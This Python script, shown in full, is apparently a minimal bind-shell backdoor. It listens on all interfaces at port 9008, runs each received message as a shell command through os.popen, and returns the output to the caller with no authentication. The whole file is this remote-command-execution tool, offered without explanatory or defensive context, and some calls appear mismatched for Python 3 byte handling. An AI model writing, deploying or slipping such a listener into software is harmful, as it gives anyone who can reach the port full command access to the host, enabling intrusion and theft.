import socket
import threading
import os

bind_ip = "0.0.0.0"
bind_port = 9008

server = socket.socket()  # Defaults (socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_ip, bind_port))
server.listen(5)


def handle_client(client_socket):
    request = client_socket.recv(4096)
    command_response = os.popen(request).read()
    client_socket.send(command_response)
    client_socket.close()


while True:
    client, addr = server.accept()
    client_handler = threading.Thread(target=handle_client,args=(client,))
    client_handler.start()
